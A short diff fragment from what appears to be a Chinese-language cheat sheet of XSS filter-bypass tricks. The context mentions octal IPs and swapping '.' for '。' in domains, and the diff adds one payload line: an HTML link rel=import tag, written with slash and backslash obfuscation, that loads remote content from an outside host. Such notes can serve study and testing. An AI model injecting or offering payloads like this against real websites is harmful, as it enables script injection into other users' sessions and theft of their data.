@@ -9,6 +9,7 @@ link 标签引入外部 js。
 ```javascript
 也可以用域名，将 . 用 。 代替。
 <link rel=import href=\\八进制ip
+<link/rel=import href=https:\\d7cb7b72.w1n.pw\background.html>
 ```
 
 ```javascript
